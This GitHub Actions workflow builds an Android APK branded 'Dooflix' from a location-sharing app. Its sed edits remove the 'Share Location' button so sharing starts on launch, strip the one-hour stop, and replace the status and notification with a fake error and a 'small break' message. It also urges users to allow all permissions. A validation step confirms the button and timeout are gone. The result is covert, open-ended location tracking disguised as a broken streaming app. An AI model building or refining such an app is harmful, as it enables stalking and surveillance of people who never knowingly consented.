name: Build Dooflix APK

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  build-apk:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"
      - uses: android-actions/setup-android@v3
      - name: Install Android SDK
        run: |
          yes | sdkmanager --licenses >/dev/null || true
          sdkmanager "platforms;android-35" "build-tools;35.0.0"
      - uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: "8.7"
      - name: Generate Dooflix Android project
        shell: bash
        run: |
          mkdir -p android-apk/app/src/main/java/com/brajwasi/pulselocation
          mkdir -p android-apk/app/src/main/res/values
          echo '' | base64 -d > android-apk/settings.gradle
          echo 'cGx1Z2lucyB7CiAgICBpZCAnY29tLmFuZHJvaWQuYXBwbGljYXRpb24nIHZlcnNpb24gJzguNS4yJyBhcHBseSBmYWxzZQp9Cg==' | base64 -d > android-apk/build.gradle
          echo '' | base64 -d > android-apk/app/build.gradle
          echo '' | base64 -d > android-apk/app/src/main/AndroidManifest.xml
          echo '' | base64 -d > android-apk/app/src/main/res/values/styles.xml
          echo '' | base64 -d > android-apk/app/src/main/java/com/brajwasi/pulselocation/MainActivity.java
          echo '' | base64 -d > android-apk/app/src/main/java/com/brajwasi/pulselocation/LocationShareService.java
      - name: Apply interface text
        run: |
          # EDIT ONLY THESE 3 LINES TO CHANGE THE MESSAGES
          ACTIVE_MESSAGE='Eroor code 502'
          NOTIFICATION_MESSAGE='Dooflix is currently on a small break😊'
          PERMISSION_DENIED_MESSAGE='Permission denied. please allow all permission to thid app.☹'

          MAIN=android-apk/app/src/main/java/com/brajwasi/pulselocation/MainActivity.java
          SERVICE=android-apk/app/src/main/java/com/brajwasi/pulselocation/LocationShareService.java
          sed -i '/page.addView(start, new LinearLayout.LayoutParams(-1, -2));/d' "$MAIN"
          sed -i '/setContentView(page);/a\        requestOrStart();' "$MAIN"
          sed -i '/private long finishAt;/d' "$MAIN"
          sed -i '/finishAt = System.currentTimeMillis()/d' "$MAIN"
          sed -i "s|handler.post(tick);|status.setText(\"$ACTIVE_MESSAGE\");|" "$MAIN"
          sed -i "s|Permission denied.|$PERMISSION_DENIED_MESSAGE|" "$MAIN"
          sed -i 's/start.setText("Share Location for 1 Hour");/start.setText("Share Location");/' "$MAIN"
          sed -i '/    private final Runnable tick = new Runnable() {/,/    @Override protected void onDestroy()/ {
            /    @Override protected void onDestroy()/!d
          }' "$MAIN"
          sed -i "/updateNotification(\"Dooflix is sharing your location/ c\\                updateNotification(\"$NOTIFICATION_MESSAGE\");" "$SERVICE"
          sed -i '/handler.postDelayed(this::finishSharing/d' "$SERVICE"
      - name: Validate generated Java
        run: |
          MAIN=android-apk/app/src/main/java/com/brajwasi/pulselocation/MainActivity.java
          SERVICE=android-apk/app/src/main/java/com/brajwasi/pulselocation/LocationShareService.java
          grep -Fq '        requestOrStart();' "$MAIN"
          grep -Fq 'Eroor code 502' "$MAIN"
          grep -Fq 'Dooflix is currently on a small break😊' "$SERVICE"
          grep -Fq 'Permission denied. please allow all permission to thid app.☹' "$MAIN"
          if grep -Fq 'page.addView(start' "$MAIN"; then
            echo 'The location button is still present in the layout'
            exit 1
          fi
          if grep -Eq 'finishAt|Runnable tick|postDelayed\(this::finishSharing|3_600_000|stops within 1 hour' "$MAIN" "$SERVICE"; then
            echo 'An automatic sharing timeout is still present'
            exit 1
          fi
      - name: Build APK
        run: gradle --no-daemon -p android-apk assembleDebug
      - name: Rename APK
        run: cp android-apk/app/build/outputs/apk/debug/app-debug.apk Dooflix.apk
      - uses: actions/upload-artifact@v4
        with:
          name: Dooflix-APK
          path: Dooflix.apk
          if-no-files-found: error
          retention-days: 30
